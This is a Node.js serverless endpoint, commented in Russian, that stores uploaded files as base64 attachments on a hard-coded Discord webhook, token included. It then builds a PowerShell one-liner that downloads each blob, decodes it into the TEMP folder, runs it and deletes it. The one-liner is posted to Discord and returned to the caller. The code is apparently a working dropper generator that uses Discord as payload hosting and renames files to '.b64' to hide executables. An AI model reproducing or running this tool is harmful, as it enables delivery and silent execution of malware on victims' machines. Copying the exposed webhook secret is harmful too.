const https = require('https');

const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1504857329190048006/VKZEEClNQkY75JLhBYc91V5fr8buY5A-O8fgnJFtDVnHVwCc9Fro54FI9ZJrGSpssVh2';

// Вспомогательная функция для парсинга multipart
function parseMultipart(data, boundary) {
    const parts = [];
    const boundaryBuffer = Buffer.from('--' + boundary);
    let start = data.indexOf(boundaryBuffer);
    
    while (start !== -1) {
        let end = data.indexOf(boundaryBuffer, start + boundaryBuffer.length);
        if (end === -1) break;
        
        const part = data.slice(start + boundaryBuffer.length, end);
        const headerEnd = part.indexOf('\r\n\r\n');
        
        if (headerEnd !== -1) {
            const headers = part.slice(0, headerEnd).toString();
            let content = part.slice(headerEnd + 4);
            if (content.slice(-2).toString() === '\r\n') {
                content = content.slice(0, -2);
            }
            
            const nameMatch = headers.match(/name="([^"]+)"/);
            const filenameMatch = headers.match(/filename="([^"]+)"/);
            
            if (nameMatch) {
                parts.push({
                    name: nameMatch[1],
                    filename: filenameMatch ? filenameMatch[1] : null,
                    content: content
                });
            }
        }
        start = end;
        if (data.slice(start + boundaryBuffer.length, start + boundaryBuffer.length + 2).toString() === '--') {
            break;
        }
    }
    return parts;
}

function sendDiscordMessage(content) {
    return new Promise((resolve, reject) => {
        try {
            const webhookUrl = new URL(DISCORD_WEBHOOK);
            const data = JSON.stringify({ content });
            
            const req = https.request({
                hostname: webhookUrl.hostname,
                path: webhookUrl.pathname,
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) }
            }, res => {
                let body = '';
                res.on('data', chunk => body += chunk);
                res.on('end', () => resolve(body));
            });
            
            req.on('error', reject);
            req.write(data);
            req.end();
        } catch (e) {
            reject(e);
        }
    });
}

function uploadFileToDiscord(filePart) {
    return new Promise((resolve, reject) => {
        try {
            const base64Content = filePart.content.toString('base64');
            const encodedFilename = (filePart.filename || 'file').replace(/\.[^/.]+$/, '') + '.b64';
            const boundary = '----DiscordBoundary' + Math.random().toString(36).substring(2);
            
            const header = `--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="${encodedFilename}"\r\nContent-Type: text/plain\r\n\r\n`;
            const footer = `\r\n--${boundary}--\r\n`;
            
            const body = Buffer.concat([
                Buffer.from(header),
                Buffer.from(base64Content),
                Buffer.from(footer)
            ]);
            
            const webhookUrl = new URL(DISCORD_WEBHOOK);
            const req = https.request({
                hostname: webhookUrl.hostname,
                path: webhookUrl.pathname,
                method: 'POST',
                headers: {
                    'Content-Type': `multipart/form-data; boundary=${boundary}`,
                    'Content-Length': body.length
                }
            }, res => {
                let responseData = '';
                res.on('data', chunk => responseData += chunk);
                res.on('end', () => {
                    try {
                        const json = JSON.parse(responseData);
                        if (json.attachments && json.attachments[0]) {
                            resolve({
                                fileUrl: json.attachments[0].url,
                                originalName: filePart.filename
                            });
                        } else {
                            reject(new Error('Discord upload failed: ' + responseData));
                        }
                    } catch (e) {
                        reject(new Error('Invalid Discord response: ' + responseData));
                    }
                });
            });
            
            req.on('error', reject);
            req.write(body);
            req.end();
        } catch (e) {
            reject(e);
        }
    });
}

module.exports = async (req, res) => {
    // Настройка CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ success: false, error: 'Method not allowed' });
    }

    try {
        const contentType = req.headers['content-type'] || '';
        const boundaryMatch = contentType.match(/boundary=(?:"([^"]+)"|([^;]+))/);
        
        if (!boundaryMatch) {
            return res.status(400).json({ success: false, error: 'No boundary in Content-Type' });
        }
        
        const boundary = boundaryMatch[1] || boundaryMatch[2];

        // Чтение тела запроса
        const chunks = [];
        let totalLength = 0;
        
        for await (const chunk of req) {
            totalLength += chunk.length;
            if (totalLength > 5 * 1024 * 1024) { // 5MB limit
                return res.status(413).json({ success: false, error: 'File too large (max 5MB)' });
            }
            chunks.push(chunk);
        }
        
        const buffer = Buffer.concat(chunks);
        const parts = parseMultipart(buffer, boundary);
        const fileParts = parts.filter(p => p.name === 'fileToUpload' && p.filename);

        if (fileParts.length === 0) {
            return res.status(400).json({ success: false, error: 'No files provided' });
        }

        // Загрузка файлов
        const uploadResults = [];
        for (const filePart of fileParts) {
            const result = await uploadFileToDiscord(filePart);
            uploadResults.push(result);
        }

        // Генерация команды
        let combinedCmd = '';
        if (uploadResults.length === 1) {
            const r = uploadResults[0];
            combinedCmd = `powershell -c "$t=\\"$env:TEMP\\${r.originalName}\\";$u='${r.fileUrl}';[IO.File]::WriteAllBytes($t,[Convert]::FromBase64String((irm $u)));Start-Process $t -Wait;Remove-Item $t"`;
        } else {
            let varDefs = [], cmdParts = [], startParts = [], tVars = [];
            uploadResults.forEach((r, i) => {
                const idx = i + 1;
                varDefs.push(`$t${idx}=\\"$env:TEMP\\${r.originalName}\\"`, `$u${idx}='${r.fileUrl}'`);
                cmdParts.push(`[IO.File]::WriteAllBytes($t${idx},[Convert]::FromBase64String((irm $u${idx})))`);
                startParts.push(`Start-Process $t${idx} -Wait`);
                tVars.push(`$t${idx}`);
            });
            combinedCmd = `powershell -c "${varDefs.join(';')};${cmdParts.join(';')};${startParts.join(';')};Remove-Item ${tVars.join(',')}"`;
        }

        // Отправка в Discord
        const fileNames = uploadResults.map(r => r.originalName).join(', ');
        await sendDiscordMessage(`📁 **${fileNames}**\n\nКоманда для запуска:\n\`\`\`powershell\n${combinedCmd}\n\`\`\``);

        return res.status(200).json({
            success: true,
            files: uploadResults,
            command: combinedCmd
        });

    } catch (error) {
        console.error('API Error:', error);
        return res.status(500).json({ 
            success: false, 
            error: 'Server Error: ' + error.message 
        });
    }
};
